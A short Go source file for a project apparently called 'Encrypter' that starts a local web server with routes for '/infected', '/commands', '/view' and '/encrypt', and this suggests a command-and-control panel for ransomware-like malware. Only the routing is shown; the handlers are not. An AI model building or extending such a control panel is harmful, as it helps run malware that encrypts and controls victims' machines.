package main

import (
	"Encrypter/Webserver"
	"log"
	"net/http"
)

func main() {
	//Initialise webserver
	http.HandleFunc("/", Webserver.HomeHandler)
	http.HandleFunc("/infected", Webserver.InfectedHandler)
	http.HandleFunc("/commands", Webserver.CommandHandler)
	http.HandleFunc("/view", Webserver.ViewInfected)
	http.HandleFunc("/encrypt", Webserver.EncryptHandler)

	//Initialise the fileserver
	fileServer := http.FileServer(http.Dir("./files"))
	http.Handle("/resources/", http.StripPrefix("/resources", fileServer))

	err := http.ListenAndServe("localhost:8080", nil)
	log.Fatalf("Webserver runtime issue: %s", err.Error())

}
